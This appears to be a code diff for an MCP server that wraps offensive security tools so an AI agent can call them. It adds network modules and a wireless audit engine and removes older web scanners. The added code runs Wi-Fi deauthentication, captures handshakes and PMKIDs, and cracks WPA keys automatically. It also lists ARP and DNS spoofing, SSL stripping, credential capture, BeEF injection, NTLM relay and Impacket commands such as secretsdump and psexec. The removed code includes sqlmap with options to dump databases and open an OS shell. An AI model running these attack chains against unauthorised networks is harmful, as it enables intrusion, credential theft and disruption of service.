+                    match = re.match(r"\s+(\S+)\s+(Disk|IPC|Printer)\s*(.*)", line)
+                    if match and not any(s["name"] == match.group(1) for s in smb_results["shares"]):
+                        smb_results["shares"].append({
+                            "name": match.group(1),
+                            "type": match.group(2),
+                            "comment": match.group(3).strip(),
+                        })
+
+            if depth in ["deep", "aggressive"]:
+                # Try anonymous access to each share
+                for share in smb_results["shares"]:
+                    share_access = await run_command(
+                        ["smbclient", f"//{target}/{share['name']}", "-N", "-c", "dir"],
+                        timeout=15,
+                    )
+                    share["anonymous_access"] = share_access.get("success", False)
+                    if share_access.get("stdout") and "NT_STATUS" not in share_access["stdout"]:
+                        share["files"] = share_access["stdout"][:500]
+
+            results["modules"]["smb"] = smb_results
+            if smb_results["shares"] or smb_results["users"]:
+                pentest_memory.store_finding(target, "network_dominator", "smb_shares",
+                                             {"shares": len(smb_results["shares"]),
+                                              "users": smb_results["users"]})
+
+        # --- BETTERCAP ---
+        if "bettercap" in mod_list:
+            bc_results = {"capabilities": [], "commands": []}
+            # Check bettercap availability
+            bc_check = await run_command(["which", "bettercap"], timeout=5)
+            if bc_check.get("success"):
+                iface = interface or "eth0"
+                # Network probe
+                if depth in ["light", "deep", "aggressive"]:
+                    bc_cmd = f"bettercap -iface {iface} -eval 'net.probe on; sleep 5; net.show; quit' -no-colors"
+                    bc_result = await run_command_shell(bc_cmd, timeout=30)
+                    bc_results["net_probe"] = bc_result.get("stdout", "")[:3000]
+
+                if depth == "aggressive":
+                    bc_results["capabilities"].extend([
+                        "ARP spoofing: bettercap -iface {iface} -eval 'set arp.spoof.targets {target}; arp.spoof on'",
+                        "DNS spoofing: bettercap -eval 'set dns.spoof.domains example.com; dns.spoof on'",
+                        "HTTP proxy: bettercap -eval 'set http.proxy.sslstrip true; http.proxy on'",
+                        "HTTPS proxy with sslstrip: bettercap -eval 'set https.proxy.sslstrip true; https.proxy on'",
+                        "WiFi deauth: bettercap -eval 'wifi.recon on; wifi.deauth BSSID'",
+                        "BLE recon: bettercap -eval 'ble.recon on'",
+                        "Packet sniffing: bettercap -eval 'net.sniff on'",
+                    ])
+                    bc_results["caplets"] = [
+                        "http-ui: Web UI for bettercap",
+                        "hstshijack: HSTS bypass + SSL strip",
+                        "login-manager: Capture credentials from HTTP traffic",
+                        "beef-inject: Inject BeEF hook into HTTP pages",
+                    ]
+            else:
+                bc_results["error"] = "bettercap not installed. Install: apt install bettercap"
+            results["modules"]["bettercap"] = bc_results
+
+        # --- RESPONDER (LLMNR/NBNS poisoning) ---
+        if "responder" in mod_list:
+            resp_results = {"capabilities": [], "status": "ready"}
+            resp_check = await run_command(["which", "responder"], timeout=5)
+            if resp_check.get("success"):
+                iface = interface or "eth0"
+                if depth in ["deep", "aggressive"]:
+                    resp_results["capabilities"] = [
+                        f"LLMNR/NBNS poisoning: responder -I {iface} -wFb",
+                        f"Analyze mode: responder -I {iface} -A",
+                        f"With DHCP: responder -I {iface} -wFb -d",
+                        "Captures: NTLMv1, NTLMv2, HTTP Basic, FTP, LDAP, MSSQL credentials",
+                    ]
+                    if depth == "aggressive":
+                        resp_results["relay_commands"] = [
+                            f"NTLM relay to SMB: impacket-ntlmrelayx -t {target} -smb2support",
+                            f"NTLM relay to LDAP: impacket-ntlmrelayx -t ldap://{target} --delegate-access",
+                            f"NTLM relay to HTTP: impacket-ntlmrelayx -t http://{target} -c 'whoami'",
+                        ]
+                # Analyze mode (passive - safe to run)
+                analyze_result = await run_command_shell(
+                    f"timeout 10 responder -I {interface or 'eth0'} -A 2>&1 || true",
+                    timeout=15,
+                )
+                resp_results["analyze_output"] = analyze_result.get("stdout", "")[:1000]
+            else:
+                resp_results["error"] = "responder not installed. Install: apt install responder"
+            results["modules"]["responder"] = resp_results
+
+        # --- IMPACKET TOOLS ---
+        if "impacket" in mod_list:
+            imp_results = {"available_tools": [], "results": {}}
+            impacket_tools = {
+                "secretsdump": "impacket-secretsdump",
+                "psexec": "impacket-psexec",
+                "wmiexec": "impacket-wmiexec",
+                "smbexec": "impacket-smbexec",
+                "dcomexec": "impacket-dcomexec",
+                "ntlmrelayx": "impacket-ntlmrelayx",
+                "GetNPUsers": "impacket-GetNPUsers",
+                "GetUserSPNs": "impacket-GetUserSPNs",
+                "lookupsid": "impacket-lookupsid",
+            }
+            for name, cmd in impacket_tools.items():
+                check = await run_command(["which", cmd], timeout=3)
+                if check.get("success"):
+                    imp_results["available_tools"].append(name)
+
+            # Run safe enumeration tools
+            if "lookupsid" in imp_results["available_tools"]:
+                sid_result = await run_command(
+                    ["impacket-lookupsid", f"anonymous@{target}", "-no-pass"],
+                    timeout=30,
+                )
+                if sid_result.get("stdout"):
+                    imp_results["results"]["sid_enum"] = sid_result["stdout"][:2000]
+
+            if depth == "aggressive" and "GetNPUsers" in imp_results["available_tools"]:
+                imp_results["commands"] = {
+                    "as_rep_roast": f"impacket-GetNPUsers -dc-ip {target} DOMAIN/ -no-pass -usersfile users.txt",
+                    "kerberoast": f"impacket-GetUserSPNs -dc-ip {target} DOMAIN/user:password -request",
+                    "secretsdump": f"impacket-secretsdump DOMAIN/admin:password@{target}",
+                    "psexec": f"impacket-psexec DOMAIN/admin:password@{target}",
+                }
+            results["modules"]["impacket"] = imp_results
+
+        results["recommendations"] = orchestrator.recommend_next_tools(target)
+        session_manager.complete_execution(execution, results)
+        return json.dumps(results, indent=2, default=str)
+
+    except Exception as e:
+        session_manager.complete_execution(execution, {"error": str(e)}, "failed")
+        return json.dumps({"error": str(e), "traceback": traceback.format_exc()})
+
+
+# ============================================================================
+# MODULE 6: WIRELESS AUDIT
+# NEW: aircrack-ng, bettercap WiFi, PMKID, WPA/WPA2 crack, monitor mode
+# ============================================================================
+
+@mcp.tool()
+async def wireless_audit(
+    interface: str = "wlan0",
+    target_bssid: Optional[str] = None,
+    depth: str = "deep",
+    modules: str = "all",
+    wordlist: str = "auto",
+    timeout: int = 600,
+) -> str:
+    """
+    Unified wireless pentest engine. Combines: aircrack-ng suite (airmon, airodump,
+    aireplay, aircrack), bettercap WiFi, PMKID capture (hcxdumptool), hashcat WPA crack.
+    Auto-chain: discover -> capture handshake -> crack.
+
+    modules: all | comma-separated: monitor,scan,deauth,capture,pmkid,crack
+    """
+    timeout = InputValidator.validate_timeout(timeout)
+    execution = session_manager.start_execution("wireless_audit", interface,
+                                                 {"depth": depth, "bssid": target_bssid})
+    results = {"interface": interface, "depth": depth, "modules": {}}
+
+    try:
+        mod_list = modules.split(",") if modules != "all" else ["monitor", "scan", "capture", "pmkid", "crack"]
+        wl = "/usr/share/wordlists/rockyou.txt" if wordlist == "auto" else wordlist
+
+        # --- MONITOR MODE ---
+        if "monitor" in mod_list:
+            mon_results = {"status": "pending"}
+            # Check interface
+            iw_check = await run_command(["iw", "dev"], timeout=10)
+            mon_results["interfaces"] = iw_check.get("stdout", "")[:1000]
+
+            # Kill interfering processes
+            await run_command(["airmon-ng", "check", "kill"], timeout=10)
+
+            # Enable monitor mode
+            mon_result = await run_command(["airmon-ng", "start", interface], timeout=15)
+            if mon_result.get("success"):
+                mon_results["status"] = "monitor_enabled"
+                mon_results["monitor_interface"] = f"{interface}mon"
+            else:
+                mon_results["status"] = "failed"
+                mon_results["error"] = mon_result.get("stderr", "Could not enable monitor mode")
+                # Try alternative: ip link set
+                alt = await run_command_shell(
+                    f"ip link set {interface} down && iw {interface} set monitor control && ip link set {interface} up",
+                    timeout=10,
+                )
+                if alt.get("success"):
+                    mon_results["status"] = "monitor_enabled_alt"
+                    mon_results["monitor_interface"] = interface
+            results["modules"]["monitor"] = mon_results
+
+        # --- SCAN NETWORKS ---
+        if "scan" in mod_list:
+            scan_results = {"networks": []}
+            mon_iface = results.get("modules", {}).get("monitor", {}).get("monitor_interface", f"{interface}mon")
+            # Quick scan with airodump-ng
+            scan_cmd = f"timeout 15 airodump-ng {mon_iface} --write /tmp/wifi_scan --output-format csv 2>&1 || true"
+            await run_command_shell(scan_cmd, timeout=20)
+            # Parse CSV output
+            csv_path = "/tmp/wifi_scan-01.csv"
+            if os.path.exists(csv_path):
+                with open(csv_path) as f:
+                    csv_content = f.read()
+                # Parse APs
+                in_ap_section = True
+                for line in csv_content.split("\n"):
+                    if "Station MAC" in line:
+                        in_ap_section = False
+                        continue
+                    if in_ap_section and "," in line:
+                        parts = [p.strip() for p in line.split(",")]
+                        if len(parts) >= 14 and re.match(r"[0-9A-Fa-f:]{17}", parts[0]):
+                            scan_results["networks"].append({
+                                "bssid": parts[0],
+                                "channel": parts[3],
+                                "power": parts[8],
+                                "encryption": parts[5],
+                                "cipher": parts[6],
+                                "auth": parts[7],
+                                "essid": parts[13],
+                            })
+            # Bettercap WiFi scan as alternative
+            if not scan_results["networks"]:
+                bc_wifi = await run_command_shell(
+                    f"timeout 15 bettercap -iface {mon_iface} -eval 'wifi.recon on; sleep 10; wifi.show; quit' -no-colors 2>&1 || true",
+                    timeout=20,
+                )
+                scan_results["bettercap_output"] = bc_wifi.get("stdout", "")[:2000]
+
+            results["modules"]["scan"] = scan_results
+            if scan_results["networks"]:
+                pentest_memory.store_finding(interface, "wireless_audit", "wifi_networks",
+                                             {"count": len(scan_results["networks"])})
+
+        # --- HANDSHAKE CAPTURE ---
+        if "capture" in mod_list and target_bssid:
+            cap_results = {"status": "pending", "handshake_captured": False}
+            mon_iface = results.get("modules", {}).get("monitor", {}).get("monitor_interface", f"{interface}mon")
+
+            # Find channel for target
+            target_network = None
+            for net in results.get("modules", {}).get("scan", {}).get("networks", []):
+                if net["bssid"].lower() == target_bssid.lower():
+                    target_network = net
                     break
 
-            # Extract meta generator
-            gen_match = re.search(r'<meta[^>]*name=["\']generator["\'][^>]*content=["\'](.*?)["\']', html)
-            if gen_match:
-                result_data["cms_version"] = gen_match.group(1)
-                result_data["technologies"].append(f"Generator: {gen_match.group(1)}")
+            channel = target_network["channel"] if target_network else "6"
 
-            # Technology detection from headers
-            hdr_fetch = run_command_advanced(["curl", "-skI", "--max-time", "10", url], timeout=15, trace=trace)
-            if hdr_fetch["success"]:
-                headers_text = hdr_fetch["stdout"]
-                for line in headers_text.split('\n'):
-                    if ':' in line:
-                        k, v = line.split(':', 1)
-                        k, v = k.strip().lower(), v.strip()
-                        if k == "server":
-                            result_data["technologies"].append(f"Server: {v}")
-                        elif k == "x-powered-by":
-                            result_data["technologies"].append(f"Framework: {v}")
+            # Start capture
+            cap_file = f"/tmp/capture_{target_bssid.replace(':', '')}"
+            capture_cmd = (
+                f"timeout 60 airodump-ng -c {channel} --bssid {target_bssid} "
+                f"-w {cap_file} {mon_iface} 2>&1 &"
+            )
+            await run_command_shell(capture_cmd, timeout=5)
+            await asyncio.sleep(3)
 
-    # 3. Port scan (quick)
-    if scan_ports:
-        progress.update("Quick port scan")
-        port_cmd = run_command_advanced(
-            ["nmap", "-F", "-T4", "--open", "-oG", "-", target],
-            timeout=60, trace=trace
-        )
-        if port_cmd["success"]:
-            for line in port_cmd["stdout"].split('\n'):
-                ports_match = re.findall(r'(\d+)/open/(\w+)//([^/]*)', line)
-                for port, proto, service in ports_match:
-                    result_data["ports"].append({"port": port, "protocol": proto, "service": service})
+            # Send deauth if deep/aggressive
+            if depth in ["deep", "aggressive"]:
+                deauth_cmd = f"aireplay-ng -0 5 -a {target_bssid} {mon_iface} 2>&1"
+                deauth_result = await run_command_shell(deauth_cmd, timeout=15)
+                cap_results["deauth_sent"] = True
+                cap_results["deauth_output"] = deauth_result.get("stdout", "")[:500]
 
-    # 4. DNS info
-    if scan_dns:
-        progress.update("DNS reconnaissance")
-        for rtype in ["A", "MX", "NS", "TXT"]:
-            dns_cmd = run_command_advanced(["dig", "+short", rtype, target], timeout=10, trace=trace)
-            if dns_cmd["success"] and dns_cmd["stdout"]:
-                result_data["dns_info"][rtype] = [r.strip() for r in dns_cmd["stdout"].split('\n') if r.strip()]
+            # Wait for handshake
+            await asyncio.sleep(15)
 
-    # 5. CVE correlation
-    progress.update("CVE correlation")
-    if result_data["cms_detected"]:
-        cms_cves = CVECartographer.lookup_cves(result_data["cms_detected"], result_data.get("cms_version", "") or "")
-        result_data["vulnerabilities"].extend(cms_cves)
+            # Check if handshake captured
+            cap_check = await run_command(
+                ["aircrack-ng", f"{cap_file}-01.cap"],
+                timeout=10,
+            )
+            if cap_check.get("stdout") and "1 handshake" in cap_check["stdout"]:
+                cap_results["handshake_captured"] = True
+                cap_results["capture_file"] = f"{cap_file}-01.cap"
+                cap_results["status"] = "success"
+                pentest_memory.store_finding(interface, "wireless_audit", "handshake_captured",
+                                             {"bssid": target_bssid, "file": f"{cap_file}-01.cap"})
+            else:
+                cap_results["status"] = "no_handshake"
 
-    for svc in result_data.get("ports", []):
-        svc_cves = CVECartographer.lookup_cves(svc.get("service", ""), "")
-        result_data["vulnerabilities"].extend(svc_cves)
+            results["modules"]["capture"] = cap_results
 
-    # Deduplicate CVEs
-    seen = set()
-    unique_vulns = []
-    for v in result_data["vulnerabilities"]:
-        if v.get("cve") not in seen:
-            seen.add(v.get("cve"))
-            unique_vulns.append(v)
-    result_data["vulnerabilities"] = unique_vulns
+        # --- PMKID CAPTURE ---
+        if "pmkid" in mod_list and target_bssid:
+            pmkid_results = {"status": "pending"}
+            hcx_check = await run_command(["which", "hcxdumptool"], timeout=5)
+            if hcx_check.get("success"):
+                mon_iface = results.get("modules", {}).get("monitor", {}).get("monitor_interface", f"{interface}mon")
+                pmkid_file = f"/tmp/pmkid_{target_bssid.replace(':', '')}"
+                pmkid_cmd = (
+                    f"timeout 30 hcxdumptool -i {mon_iface} -o {pmkid_file}.pcapng "
+                    f"--filtermode=2 --filterlist_ap={target_bssid.replace(':', '')} "
+                    f"--enable_status=1 2>&1"
+                )
+                pmkid_result = await run_command_shell(pmkid_cmd, timeout=35)
 
-    output = {
-        "status": "success",
-        "target": target,
-        **result_data,
-        "summary": {
-            "cms": result_data["cms_detected"],
-            "technologies_found": len(result_data["technologies"]),
-            "ports_open": len(result_data["ports"]),
-            "vulnerabilities_found": len(result_data["vulnerabilities"]),
-            "critical_vulns": sum(1 for v in result_data["vulnerabilities"] if v.get("severity") == "critical")
-        }
-    }
+                # Convert to hashcat format
+                if os.path.exists(f"{pmkid_file}.pcapng"):
+                    convert_cmd = f"hcxpcapngtool -o {pmkid_file}.22000 {pmkid_file}.pcapng 2>&1"
+                    convert = await run_command_shell(convert_cmd, timeout=10)
+                    if os.path.exists(f"{pmkid_file}.22000"):
+                        pmkid_results["status"] = "pmkid_captured"
+                        pmkid_results["hash_file"] = f"{pmkid_file}.22000"
+                        pentest_memory.store_finding(interface, "wireless_audit", "pmkid_captured",
+                                                     {"bssid": target_bssid, "file": f"{pmkid_file}.22000"})
+                    else:
+                        pmkid_results["status"] = "no_pmkid"
+            else:
+                pmkid_results["error"] = "hcxdumptool not installed. Install: apt install hcxdumptool hcxtools"
+            results["modules"]["pmkid"] = pmkid_results
 
-    progress.update("Complete")
-    output = chain_engine.enrich_with_context("vulnx_scan", target, output)
-    log_tool_execution("vulnx_scan", target, inputs, output, trace, progress)
-    return json.dumps(output, indent=2)
+        # --- WPA CRACKING ---
+        if "crack" in mod_list:
+            crack_results = {"methods_tried": [], "cracked": False}
+            cap_file = None
+            hash_file = None
 
+            # Find capture files from previous steps
+            for mod_name in ["capture", "pmkid"]:
+                mod_data = results.get("modules", {}).get(mod_name, {})
+                if mod_data.get("capture_file"):
+                    cap_file = mod_data["capture_file"]
+                if mod_data.get("hash_file"):
+                    hash_file = mod_data["hash_file"]
 
+            if cap_file:
+                # Aircrack-ng dictionary attack
+                ac_result = await run_command(
+                    ["aircrack-ng", cap_file, "-w", wl],
+                    timeout=min(timeout, 300),
+                )
+                crack_results["methods_tried"].append("aircrack_dictionary")
+                if ac_result.get("stdout") and "KEY FOUND" in ac_result["stdout"]:
+                    key_match = re.search(r"KEY FOUND!\s*\[\s*(.+?)\s*\]", ac_result["stdout"])
+                    if key_match:
+                        crack_results["cracked"] = True
+                        crack_results["key"] = key_match.group(1)
 
-# ============================================================================
-# WEB APPLICATION SCANNING (DEEPENED)
-# ============================================================================
+            if hash_file and not crack_results["cracked"]:
+                # Hashcat WPA attack (mode 22000)
+                hc_result = await run_command([
+                    "hashcat", "-m", "22000", hash_file, wl,
+                    "--force", "-O", "--runtime", str(min(timeout, 300)),
+                ], timeout=timeout)
+                crack_results["methods_tried"].append("hashcat_22000")
+                if "Cracked" in hc_result.get("stdout", ""):
+                    crack_results["cracked"] = True
 
-@mcp.tool()
-@resolve_references
-async def gobuster_scan(
-    url: str, mode: str = "dir", wordlist: str = "/usr/share/wordlists/dirb/common.txt",
-    extensions: str = "php,html,txt,js,json,xml,bak,old,asp,aspx",
-    threads: int = 20, status_codes: str = "200,204,301,302,307,401,403",
-    output_file: Optional[str] = None, additional_args: str = "", timeout: int = 600
-) -> str:
-    """Advanced directory/DNS/vhost enumeration with Gobuster. Modes: dir, dns, vhost, fuzz"""
-    target = url
-    trace, progress, exec_dir = _init_tool_context("gobuster_scan", target, 5)
-    inputs = {"url": url, "mode": mode, "wordlist": wordlist, "extensions": extensions, "threads": threads}
-    
-    if not output_file:
-        output_file = os.path.join(exec_dir, "artifacts", f"gobuster_{mode}_{sanitize_filename(url)}_{generate_timestamp()}.txt")
-    
-    progress.update("Building command")
-    cmd = ["gobuster", mode]
-    if mode == "dir":
-        cmd.extend(["-u", url, "-w", wordlist])
-        if extensions: cmd.extend(["-x", extensions])
-        cmd.extend(["-s", status_codes, "--no-error", "-q"])
-    elif mode == "dns":
-        cmd.extend(["-d", url, "-w", wordlist])
-    elif mode == "vhost":
-        cmd.extend(["-u", url, "-w", wordlist])
-    elif mode == "fuzz":
-        cmd.extend(["-u", url, "-w", wordlist])
-    cmd.extend(["-t", str(threads), "-o", output_file, "--timeout", "10s", "--delay", "50ms"])
-    if additional_args: cmd.extend(shlex.split(additional_args))
-    
-    progress.update("Executing gobuster scan")
-    result = run_command_advanced(cmd, timeout=timeout, trace=trace)
-    
-    progress.update("Parsing results")
-    findings = []
-    if os.path.exists(output_file):
-        try:
-            with open(output_file, 'r') as f:
-                for line in f:
-                    line = line.strip()
-                    if line and not line.startswith('='):
-                        match = re.search(r'(/\S+)\s+\(Status:\s*(\d+)\)', line)
-                        if match:
-                            findings.append({"path": match.group(1), "status": int(match.group(2)), "raw": line})
-                        elif line.startswith('/') or 'http' in line.lower():
-                            findings.append({"path": line, "raw": line})
-        except Exception as e:
-            trace.error("parse", f"Error parsing gobuster output: {e}")
-    
-    interesting = [f for f in findings if f.get("status") in [200, 301, 302]]
-    auth_required = [f for f in findings if f.get("status") in [401, 403]]
-    
-    progress.update("Analyzing findings")
-    # Deep analysis: categorize by risk
-    high_risk_patterns = [".bak", ".old", ".sql", ".dump", ".env", ".git", "admin", "config", "backup"]
-    high_risk = [f for f in findings if any(p in f.get("path", "").lower() for p in high_risk_patterns)]
-    
-    output = {
-        "status": "success" if result["success"] else "partial",
-        "target": url, "mode": mode, "wordlist": wordlist, "output_file": output_file,
-        "execution_time": result["execution_time"],
-        "summary": {"total_found": len(findings), "interesting": len(interesting),
-                     "auth_required": len(auth_required), "high_risk": len(high_risk)},
-        "findings": findings[:100],
-        "interesting_paths": [f["path"] for f in interesting],
-        "auth_required_paths": [f["path"] for f in auth_required],
-        "high_risk_paths": [{"path": f["path"], "reason": "Sensitive file/directory pattern"} for f in high_risk],
-        "errors": result["stderr"] if result["stderr"] else None
-    }
-    
-    progress.update("Complete")
-    output = chain_engine.enrich_with_context("gobuster_scan", target, output)
-    log_tool_execution("gobuster_scan", target, inputs, output, trace, progress)
-    return json.dumps(output, indent=2)
+                # Hashcat mask attack for short passwords
+                if not crack_results["cracked"]:
+                    masks = ["?d?d?d?d?d?d?d?d", "?l?l?l?l?l?l?l?l", "?a?a?a?a?a?a?a?a"]
+                    for mask in masks:
+                        mask_result = await run_command([
+                            "hashcat", "-m", "22000", "-a", "3",
+                            hash_file, mask, "--force", "-O", "--runtime", "60",
+                        ], timeout=90)
+                        crack_results["methods_tried"].append(f"hashcat_mask_{mask}")
+                        if "Cracked" in mask_result.get("stdout", ""):
+                            crack_results["cracked"] = True
+                            break
 
-@mcp.tool()
-@resolve_references
-async def nikto_scan(
-    target: str, tuning: str = "x6", plugins: Optional[str] = None,
-    output_file: Optional[str] = None, ssl: bool = False, timeout: int = 900
-) -> str:
-    """Web server vulnerability scanning with Nikto. Tuning: 0-9,a-c,x (see docs)"""
-    trace, progress, exec_dir = _init_tool_context("nikto_scan", target, 5)
-    inputs = {"target": target, "tuning": tuning, "plugins": plugins, "ssl": ssl}
-    
-    if not output_file:
-        output_file = os.path.join(exec_dir, "artifacts", f"nikto_{sanitize_filename(target)}_{generate_timestamp()}.xml")
-    
-    progress.update("Configuring Nikto scan")
-    cmd = ["nikto", "-h", target, "-Format", "xml", "-o", output_file]
-    if tuning: cmd.extend(["-Tuning", tuning])
-    if plugins: cmd.extend(["-Plugins", plugins])
-    if ssl or target.startswith("https"): cmd.append("-ssl")
-    cmd.extend(["-timeout", "10", "-maxtime", str(timeout - 60)])
-    
-    progress.update("Executing Nikto scan")
-    result = run_command_advanced(cmd, timeout=timeout, trace=trace)
-    
-    progress.update("Parsing vulnerabilities")
-    vulnerabilities = []
-    if os.path.exists(output_file):
-        try:
-            with open(output_file, 'r') as f:
-                content = f.read()
-            root = ET.fromstring(content)
-            for item in root.findall(".//item"):
-                vuln = {"id": item.get("id"), "osvdb": item.get("osvdb"), "method": item.get("method"),
-                        "uri": None, "description": None, "references": []}
-                uri = item.find("uri")
-                if uri is not None: vuln["uri"] = uri.text
-                desc = item.find("description")
-                if desc is not None: vuln["description"] = desc.text
-                for ref in item.findall("references/reference"):
-                    vuln["references"].append(ref.text)
-                vulnerabilities.append(vuln)
-        except ET.ParseError as e:
-            trace.error("parse", f"Failed to parse Nikto XML: {e}")
-    
-    progress.update("Categorizing severity")
-    critical = [v for v in vulnerabilities if any(k in str(v.get("description", "")).lower() for k in ["rce", "command execution", "sql injection", "remote code"])]
-    high = [v for v in vulnerabilities if any(k in str(v.get("description", "")).lower() for k in ["xss", "injection", "bypass", "disclosure"])]
-    
-    output = {
-        "status": "success" if result["success"] else "partial",
-        "target": target, "output_file": output_file, "execution_time": result["execution_time"],
-        "summary": {"total_findings": len(vulnerabilities), "critical": len(critical), "high": len(high)},
-        "vulnerabilities": vulnerabilities[:50], "critical_findings": critical, "high_findings": high,
-        "errors": result["stderr"] if result["stderr"] else None
-    }
-    
-    progress.update("Complete")
-    output = chain_engine.enrich_with_context("nikto_scan", target, output)
-    log_tool_execution("nikto_scan", target, inputs, output, trace, progress)
-    return json.dumps(output, indent=2)
+            results["modules"]["crack"] = crack_results
 
-# ============================================================================
-# SQL INJECTION TOOLS
-# ============================================================================
+        session_manager.complete_execution(execution, results)
+        return json.dumps(results, indent=2, default=str)
 
-@mcp.tool()
-@resolve_references
-async def sqlmap_scan(
-    url: str, data: Optional[str] = None, method: str = "GET", param: Optional[str] = None,
-    dbms: Optional[str] = None, level: int = 3, risk: int = 2, technique: str = "BEUSTQ",
-    dump: bool = False, tables: bool = False, dbs: bool = False, os_shell: bool = False,
-    tamper: Optional[str] = None, output_dir: Optional[str] = None, timeout: int = 1200
-) -> str:
-    """Advanced SQL injection testing with SQLMap. Techniques: B(oolean), E(rror), U(nion), S(tacked), T(ime), Q(inline)"""
-    target = url
-    trace, progress, exec_dir = _init_tool_context("sqlmap_scan", target, 5)
-    inputs = {"url": url, "data": data, "method": method, "param": param, "dbms": dbms,
-              "level": level, "risk": risk, "technique": technique, "dump": dump, "tamper": tamper}
-    
-    if not output_dir:
-        output_dir = os.path.join(exec_dir, "artifacts", f"sqlmap_{generate_timestamp()}")
-    os.makedirs(output_dir, exist_ok=True)
-    
-    progress.update("Building SQLMap command")
-    cmd = ["sqlmap", "-u", url, "--batch", "--output-dir", output_dir,
-           f"--level={level}", f"--risk={risk}", f"--technique={technique}",
-           "--threads=4", "--random-agent"]
-    if data: cmd.extend(["--data", data])
-    if method.upper() == "POST": cmd.append("--method=POST")
-    if param: cmd.extend(["-p", param])
-    if dbms: cmd.extend(["--dbms", dbms])
-    if tamper: cmd.extend(["--tamper", tamper])
-    if dbs: cmd.append("--dbs")
-    if tables: cmd.append("--tables")
-    if dump: cmd.append("--dump")
-    if os_shell: cmd.append("--os-shell")
-    
-    progress.update("Executing SQLMap scan")
-    result = run_command_advanced(cmd, timeout=timeout, trace=trace)
-    
-    progress.update("Analyzing injection results")
-    vulnerable = False
-    injection_points = []
-    stdout = result["stdout"].lower()
-    vuln_indicators = ["sqlmap identified the following injection point", "injectable", "is vulnerable"]
-    for indicator in vuln_indicators:
-        if indicator in stdout:
-            vulnerable = True
-            break
-    
-    lines = result["stdout"].split('\n')
-    current_injection = {}
-    for line in lines:
-        ls = line.strip()
-        if "Parameter:" in line:
-            if current_injection: injection_points.append(current_injection)
-            current_injection = {"parameter": ls.split("Parameter:")[-1].strip()}
-        elif "Type:" in line and current_injection:
-            current_injection["type"] = ls.split("Type:")[-1].strip()
-        elif "Title:" in line and current_injection:
-            current_injection["title"] = ls.split("Title:")[-1].strip()
-        elif "Payload:" in line and current_injection:
-            current_injection["payload"] = ls.split("Payload:")[-1].strip()
-    if current_injection: injection_points.append(current_injection)
-    
-    dumped_files = []
-    if os.path.exists(output_dir):
-        for r, d, files in os.walk(output_dir):
-            for file in files:
-                if file.endswith(('.csv', '.txt', '.dump')):
-                    dumped_files.append(os.path.join(r, file))
-    
-    progress.update("Building report")
-    output = {
-        "status": "success" if result["success"] else "partial",
-        "target": url, "vulnerable": vulnerable, "output_dir": output_dir,
-        "execution_time": result["execution_time"],
-        "summary": {"is_vulnerable": vulnerable, "injection_points": len(injection_points),
-                     "dumped_files": len(dumped_files)},
-        "injection_points": injection_points, "dumped_files": dumped_files,
-        "raw_output": result["stdout"][:3000],
-        "errors": result["stderr"] if result["stderr"] else None
-    }
-    
-    progress.update("Complete")
-    output = chain_engine.enrich_with_context("sqlmap_scan", target, output)
-    log_tool_execution("sqlmap_scan", target, inputs, output, trace, progress)
-    return json.dumps(output, indent=2)
-
-@mcp.tool()
-@resolve_references
-async def sql_injection_test(
-    url: str, param: str, method: str = "GET", data: Optional[str] = None,
-    db_type: str = "generic", custom_payloads: Optional[List[str]] = None, timeout: int = 300
-) -> str:
-    """Manual SQL injection testing with custom payloads and intelligent detection"""
-    target = url
-    trace, progress, exec_dir = _init_tool_context("sql_injection_test", target, 4)
-    inputs = {"url": url, "param": param, "method": method, "db_type": db_type}
-    
-    payloads = custom_payloads or PayloadGenerator.sql_injection_payloads(db_type)
-    results = []
-    vulnerable_payloads = []
-    
-    progress.update("Testing payloads", f"{len(payloads)} payloads queued")
-    for i, payload in enumerate(payloads):
-        encoded_payload = urllib.parse.quote(payload)
-        if method.upper() == "GET":
-            test_url = f"{url}{'&' if '?' in url else '?'}{param}={encoded_payload}"
-            cmd = ["curl", "-s", "-k", "--max-time", "15", "-A", "Mozilla/5.0", test_url]
-        else:
-            test_data = f"{param}={encoded_payload}"
-            if data: test_data = f"{data}&{test_data}"
-            cmd = ["curl", "-s", "-k", "--max-time", "15", "-X", "POST", "-d", test_data, "-A", "Mozilla/5.0", url]
-        
-        result = run_command_advanced(cmd, timeout=20)
-        response = result["stdout"]
-        response_lower = response.lower()
-        
-        sql_errors = ["sql syntax", "mysql", "sqlite", "postgresql", "oracle", "microsoft sql",
-                       "odbc", "syntax error", "unclosed quotation", "sqlstate", "pg_query",
-                       "mysql_fetch", "mysqli", "pdo", "database error"]
-        success_indicators = ["root:x:0:0", "admin", "password", "username",
-                               "table_name", "column_name", "information_schema"]
-        
-        error_based = any(err in response_lower for err in sql_errors)
-        data_leaked = any(ind in response_lower for ind in success_indicators)
-        
-        test_result = {
-            "payload": payload, "response_length": len(response),
-            "error_based": error_based, "data_leaked": data_leaked,
-            "vulnerable": error_based or data_leaked,
-            "confidence": "high" if data_leaked else ("medium" if error_based else "low")
-        }
-        if test_result["vulnerable"]:
-            test_result["response_preview"] = response[:500]
-            vulnerable_payloads.append(test_result)
-        results.append(test_result)
-    
-    progress.update("Analysis complete")
-    output = {
-        "status": "success", "target": url, "parameter": param, "method": method,
-        "payloads_tested": len(payloads), "vulnerable": len(vulnerable_payloads) > 0,
-        "summary": {"total_tested": len(payloads), "vulnerable_payloads": len(vulnerable_payloads),
-                     "error_based": len([r for r in results if r["error_based"]]),
-                     "data_leaked": len([r for r in results if r["data_leaked"]])},
-        "vulnerable_payloads": vulnerable_payloads, "all_results": results[:20]
-    }
-    
-    progress.update("Complete")
-    output = chain_engine.enrich_with_context("sql_injection_test", target, output)
-    log_tool_execution("sql_injection_test", target, inputs, output, trace, progress)
-    return json.dumps(output, indent=2)
-
-# ============================================================================
-# XSS, LFI, COMMAND INJECTION TESTING
-# ============================================================================
-
-@mcp.tool()
-@resolve_references
-async def xss_scan(
-    url: str, param: str, method: str = "GET", data: Optional[str] = None,
-    custom_payloads: Optional[List[str]] = None, timeout: int = 300
-) -> str:
-    """Cross-Site Scripting (XSS) vulnerability testing with advanced payloads"""
-    target = url
-    trace, progress, exec_dir = _init_tool_context("xss_scan", target, 3)
-    inputs = {"url": url, "param": param, "method": method}
-    payloads = custom_payloads or PayloadGenerator.xss_payloads()
-    results = []
-    vulnerable_payloads = []
-    
-    progress.update("Testing XSS payloads", f"{len(payloads)} payloads")
-    for payload in payloads:
-        encoded = urllib.parse.quote(payload)
-        if method.upper() == "GET":
-            test_url = f"{url}{'&' if '?' in url else '?'}{param}={encoded}"
-            cmd = ["curl", "-s", "-k", "--max-time", "10", test_url]
-        else:
-            td = f"{param}={encoded}"
-            if data: td = f"{data}&{td}"
